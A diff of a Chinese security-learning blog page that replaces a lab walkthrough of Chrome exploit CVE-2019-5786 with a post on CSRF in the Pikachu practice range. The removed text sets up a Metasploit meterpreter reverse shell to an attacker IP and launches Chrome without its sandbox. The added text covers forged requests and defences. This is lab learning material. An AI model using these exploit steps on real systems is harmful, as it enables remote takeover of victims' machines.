@@ -16,27 +16,27 @@
   <meta name="author" content="Sinky">
   <meta name="keywords" content="">
   
-    <meta name="description" content="前言： 这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！ 环境kali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 浏览下载链接推荐：https:&#x2F;&#x2F;dl.google.com&#x2F;release2&#x2F;chrome&#x2F;AMavr_Q0teHn_72.0.3626.119&#x2F;72.0.3626">
+    <meta name="description" content="CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2019-5786">
-<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/index.html">
+<meta property="og:title" content="pikachu-CSRF">
+<meta property="og:url" content="https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu-CSRF/index.html">
 <meta property="og:site_name" content="Sinky&#39;s Blog">
-<meta property="og:description" content="前言： 这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！ 环境kali win7_x86 Google_chrome_(32bit)_v72.0.3626.119 浏览下载链接推荐：https:&#x2F;&#x2F;dl.google.com&#x2F;release2&#x2F;chrome&#x2F;AMavr_Q0teHn_72.0.3626.119&#x2F;72.0.3626">
+<meta property="og:description" content="CSRFCSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击. csrf攻击满足的条件1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造 2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成 csrf与xss的区别csrf">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png">
-<meta property="og:image" content="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png">
-<meta property="article:published_time" content="2022-08-09T08:02:35.739Z">
-<meta property="article:modified_time" content="2022-08-09T08:03:08.820Z">
+<meta property="og:image" content="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/09/noayh3NpcmPvMXq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/09/usMpORoFZEmjqng.png">
+<meta property="og:image" content="https://s2.loli.net/2022/08/09/quSRzMEXBvVwPnK.png">
+<meta property="article:published_time" content="2022-08-09T08:30:06.517Z">
+<meta property="article:modified_time" content="2022-08-09T08:51:03.119Z">
 <meta property="article:author" content="Sinky">
-<meta property="article:tag" content="chrome_bug">
+<meta property="article:tag" content="pikachu">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png">
   
   
   
-  <title>CVE-2019-5786 - Sinky&#39;s Blog</title>
+  <title>pikachu-CSRF - Sinky&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -204,7 +204,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="CVE-2019-5786"></span>
+            <span id="subtitle" data-typed-text="pikachu-CSRF"></span>
           
         </div>
 
@@ -215,7 +215,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-08-09 16:02" pubdate>
+        <time datetime="2022-08-09 16:30" pubdate>
           August 9, 2022 pm
         </time>
       </span>
@@ -227,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.1k words
+          1.1k words
         
       </span>
     
@@ -238,7 +238,7 @@
         
         
         
-          18 mins
+          10 mins
         
       </span>
     
@@ -276,82 +276,52 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">CVE-2019-5786</h1>
+            <h1 style="display: none">pikachu-CSRF</h1>
             
             
               <div class="markdown-body">
                 
-                <p>前言：</p>
-<p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali</p>
-<p>win7_x86</p>
-<p>Google_chrome_(32bit)_v72.0.3626.119</p>
-<p>浏览下载链接推荐：<a target="_blank" rel="noopener" href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p>
-<h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p>
-<pre><code class="hljs">root@kali:~# msfconsole -q
-msf5 &gt; search chrome_filereader
-</code></pre>
-<blockquote>
-<p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p>
-</blockquote>
-<p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p>
-<p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
-<h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p>
+                <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p>
+<h2 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h2><p>1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p>
+<p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p>
+<h2 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h2><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p>
+<h2 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h2><p>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p>
 <ul>
-<li><p>readyState：表示读取状态</p>
+<li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li>
+<li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li>
+</ul>
+<p>2.确认凭证的有效期</p>
 <ul>
-<li>empty,0,尚未读取</li>
-<li>loading,1,正在读取</li>
-<li>done,2,读取完成</li>
+<li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li>
+</ul>
+<h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p>登录账号，抓取修改个人信息流量包。</p>
+<p><img src="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="image.png"></p>
+<p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p>
+<p>可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。</p>
+<p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p>
+<p>步骤同get。</p>
+<p>正常登录状态：</p>
+<p><img src="https://s2.loli.net/2022/08/09/noayh3NpcmPvMXq.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="image.png"></p>
+<p>点击恶意url后，用户信息直接被修改</p>
+<p><img src="https://s2.loli.net/2022/08/09/usMpORoFZEmjqng.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h1><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p>
+<p>如图获取修改信息流量包后发现增加了token，无法利用。</p>
+<p><img src="https://s2.loli.net/2022/08/09/quSRzMEXBvVwPnK.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="image.png"></p>
+<h1 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h1><ul>
+<li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li>
+<li>安全的会话管理（避免会话被利用）<ul>
+<li>不要再客户端保存敏感信息（身份认证信息）</li>
+<li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li>
 </ul>
 </li>
-<li><p>result：表示读取结果，具体格式与读取方式有关：</p>
-<ul>
-<li>readAsArrayBuffer</li>
-<li>readAsBinaryString</li>
-<li>readAsDataURL</li>
-<li>readAsText</li>
+<li>访问控制安全管理<ul>
+<li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li>
+<li>敏感信息的修改尽量使用post（post安全性高于get）</li>
+<li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li>
 </ul>
 </li>
-<li><p>onprogress：回调函数</p>
-<ul>
-<li>读取Blob触发</li>
-<li>当数据较多时会周期性触发多次</li>
+<li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li>
 </ul>
-</li>
-<li><p>onloadend：回调函数</p>
-<ul>
-<li>读取操作完成时触发，不论读取成功或失败</li>
-</ul>
-</li>
-</ul>
-<p>查看模块信息</p>
-<p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
-<p>漏洞介绍：</p>
-<figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Payload information:<br>Description:<br>  This exploit takes advantage <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> use <span class="hljs-keyword">after</span> free vulnerability <span class="hljs-keyword">in</span> <br>  Google Chrome <span class="hljs-number">72.0</span><span class="hljs-number">.3626</span><span class="hljs-number">.119</span> running <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span> <span class="hljs-title">x86</span>. <span class="hljs-title">The</span> <br>  FileReader.readAsArrayBuffer <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">can</span> <span class="hljs-title">return</span> <span class="hljs-title">multiple</span> <span class="hljs-title">references</span> </span><br>  <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> same ArrayBuffer object, which can be freed <span class="hljs-keyword">and</span> overwritten <br>  <span class="hljs-keyword">with</span> sprayed objects. The dangling ArrayBuffer reference can be used <br>  <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> sprayed objects, allowing arbitrary memory access <span class="hljs-built_in">from</span> <br>  Javascript. This is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">write</span> <span class="hljs-keyword">and</span> execute shellcode <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <br>  WebAssembly object. The shellcode is executed <span class="hljs-keyword">within</span> <span class="hljs-keyword">the</span> Chrome <br>  sandbox, so you must explicitly disable <span class="hljs-keyword">the</span> sandbox <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> payload <br>  <span class="hljs-built_in">to</span> be successful.<br></code></pre></td></tr></tbody></table></figure>
-
-<p>选择payload</p>
-<pre><code class="hljs">-&gt; set payload windows/meterpreter/reverse_tcp
-</code></pre>
-<blockquote>
-<p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p>
-</blockquote>
-<p>设置payload参数：LHOST为kali ip</p>
-<pre><code class="hljs">-&gt; set LHOST 192.168.119.128
-</code></pre>
-<p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
-<p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>
-<p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" srcset="/SinkyQ/sinkyhexo.github.io.git/img/loading.gif" lazyload alt="捕获.PNG"></p>
-<p>启动服务：run 或者exploit</p>
-<p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe</p>
-<pre><code class="hljs">-&gt; chrome.exe --no-sandbox
-</code></pre>
-<p>在弹出的chome浏览器中访问kali ip: <a target="_blank" rel="noopener" href="http://192.168.119.128:8080/">http://192.168.119.128:8080</a></p>
-<p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p>
-<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在获取session时候我遇见了很多小问题导致我不能获取，比如win7应该是x86系统，比如win7的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了session.<br>虽然后来再整理wp的时候，win7系统由于自动更新，chrome119版本也升级了，后来再安装却死活安装不上去，差点升天……</p>
-<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>exp太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的exp。</p>
-<pre><code class="hljs">https://github.com/exodusintel/CVE-2019-5786 
-</code></pre>
 
                 
               </div>
@@ -364,7 +334,7 @@ msf5 &gt; search chrome_filereader
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/chrome-bug/">#chrome_bug</a>
+        <a href="/SinkyQ/sinkyhexo.github.io.git/tags/pikachu/">#pikachu</a>
       
     </div>
   
@@ -376,8 +346,8 @@ msf5 &gt; search chrome_filereader
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>CVE-2019-5786</div>
-      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/</div>
+      <div>pikachu-CSRF</div>
+      <div>https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu-CSRF/</div>
     </div>
     <div class="license-meta">
       
@@ -419,18 +389,12 @@ msf5 &gt; search chrome_filereader
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/pikachu-CSRF/" title="pikachu-CSRF">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">pikachu-CSRF</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-0708/" title="CVE-2019-0708">
-                        <span class="hidden-mobile">CVE-2019-0708</span>
+                      <a href="/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2019-5786/" title="CVE-2019-5786">
+                        <span class="hidden-mobile">CVE-2019-5786</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
